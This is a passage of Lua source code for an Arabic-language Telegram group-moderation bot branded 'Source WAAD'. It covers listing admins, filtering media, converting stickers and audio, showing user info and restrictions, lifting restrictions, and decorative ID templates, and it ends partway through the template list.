--     Source WAAD     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:VipAll:')
text = "⌯︙قائمة المميزين العام ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مميزين عام*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local AIAN =  'AIAN:AdminAll:'
local List = DevAIAN:smembers(WAAD..AIAN)
text = "⌯︙قائمة الادمنيه العامين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد ادمنيه عامين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source WAAD     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "CXRCX")
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevAIAN:sadd(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source WAAD     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAIAN:sadd(WAAD.."AIAN:FilterSteckr"..msg.chat_id_,idsticker)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAIAN:sadd(WAAD.."AIAN:FilterPhoto"..msg.chat_id_,photo)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAIAN:sadd(WAAD.."AIAN:FilterAnimation"..msg.chat_id_,idanimation)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source WAAD     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAIAN:srem(WAAD.."AIAN:FilterSteckr"..msg.chat_id_,idsticker)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAIAN:srem(WAAD.."AIAN:FilterPhoto"..msg.chat_id_,photo)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAIAN:srem(WAAD.."AIAN:FilterAnimation"..msg.chat_id_,idanimation)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source WAAD     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل تحويل الصيغ")
DevAIAN:del(WAAD..'AIAN:Thwel:AIAN'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل تحويل الصيغ")
DevAIAN:set(WAAD..'AIAN:Thwel:AIAN'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevAIAN:get(WAAD..'AIAN:Thwel:AIAN'..msg.chat_id_) and ChCheck(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local AIAN = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..AIAN.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local AIAN = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..AIAN.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','⌯︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local AIAN = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..AIAN.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"⌯︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local AIAN = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..AIAN.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source WAAD     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevAIAN:sismember(WAAD..'AIAN:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAIAN:sismember(WAAD..'AIAN:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevAIAN:sismember(WAAD..'AIAN:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAIAN:sismember(WAAD..'AIAN:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌯︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAIAN:sismember(WAAD..'AIAN:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n⌯︙عدد الكروبات ↫ '..(DevAIAN:get(WAAD..'AIAN:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n⌯︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌯︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n⌯︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌯︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⌯︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌯︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌯︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙معرفه ↫ [@'..data.username_..']\n⌯︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌯︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⌯︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌯︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌯︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '⌯︙نوع الحساب ↫ ❨ '..ch..' ❩\n⌯︙الايدي ↫ ❨ `'..res.id_..'` ❩\n⌯︙المعرف ↫ ❨ [@'..username..'] ❩\n⌯︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_AIAN(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '⌯︙نوع الحساب ↫ ❨ '..gr..' ❩\n⌯︙الايدي ↫ ❨ '..res.id_..' ❩\n⌯︙المعرف ↫ ❨ [@'..username..'] ❩\n⌯︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_AIAN(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevAIAN:sismember(WAAD..'AIAN:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAIAN:sismember(WAAD..'AIAN:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevAIAN:sismember(WAAD..'AIAN:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAIAN:sismember(WAAD..'AIAN:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌯︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAIAN:sismember(WAAD..'AIAN:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n⌯︙عدد الكروبات ↫ '..(DevAIAN:get(WAAD..'AIAN:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n⌯︙لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الحساب محذوف', 1, 'md')
return false  end
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙معرفه ↫ [@'..data.username_..']\n⌯︙ايديه ↫ ❨ `'..res.id_..'` ❩\n⌯︙رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n⌯︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌯︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌯︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevAIAN:sismember(WAAD..'AIAN:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevAIAN:sismember(WAAD..'AIAN:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevAIAN:sismember(WAAD..'AIAN:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAIAN:sismember(WAAD..'AIAN:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌯︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAIAN:sismember(WAAD..'AIAN:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n⌯︙عدد الكروبات ↫ '..(DevAIAN:get(WAAD..'AIAN:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n⌯︙لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌯︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n⌯︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌯︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⌯︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌯︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌯︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙معرفه ↫ [@'..data.username_..']\n⌯︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌯︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⌯︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌯︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌯︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source WAAD     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAIAN:sismember(WAAD..'AIAN:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAIAN:sismember(WAAD..'AIAN:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAIAN:sismember(WAAD..'AIAN:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAIAN:sismember(WAAD..'AIAN:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الحظر العام ↫ '..banall..'\n⌯︙الكتم العام ↫ '..muteall..'\n⌯︙الحظر ↫ '..banned..'\n⌯︙الكتم ↫ '..muted..'\n⌯︙التقيد ↫ '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAIAN:sismember(WAAD..'AIAN:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAIAN:sismember(WAAD..'AIAN:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAIAN:sismember(WAAD..'AIAN:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAIAN:sismember(WAAD..'AIAN:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الحظر العام ↫ '..banall..'\n⌯︙الكتم العام ↫ '..muteall..'\n⌯︙الحظر ↫ '..banned..'\n⌯︙الكتم ↫ '..muted..'\n⌯︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:BanAll:',result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,result.sender_user_id_) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","⌯︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,user) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,user) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,user) DevAIAN:srem(WAAD..'AIAN:BanAll:',user) DevAIAN:srem(WAAD..'AIAN:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,user) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,user) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,result.id_) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,result.id_) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,result.id_) DevAIAN:srem(WAAD..'AIAN:BanAll:',result.id_) DevAIAN:srem(WAAD..'AIAN:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_,result.id_) DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_,result.id_) DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source WAAD     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
⌯︙𝐔𝐒𝐄𝐑 ↬ #username 
⌯︙𝐈𝐃 ↬ #id
⌯︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
⌯︙𝐀𝐔𝐓𝐎 ↬ #cont 
⌯︙𝐌𝐀𝐒𝐆 ↬ #msgs
⌯︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇮🇶- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇮🇶- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇮🇶- #stast 
𝐌𝐬𝐠𝐒☤🇮🇶 - #msgs
]],
[[
⌔︙Msgs : #msgs .
⌔︙ID : #id .
⌔︙Stast : #stast .
⌔︙UserName : #username .
]],
[[
≈ 𝒖𝒔𝒆 √ #username '
≈ 𝒎𝒔𝒈 √ #msgs '
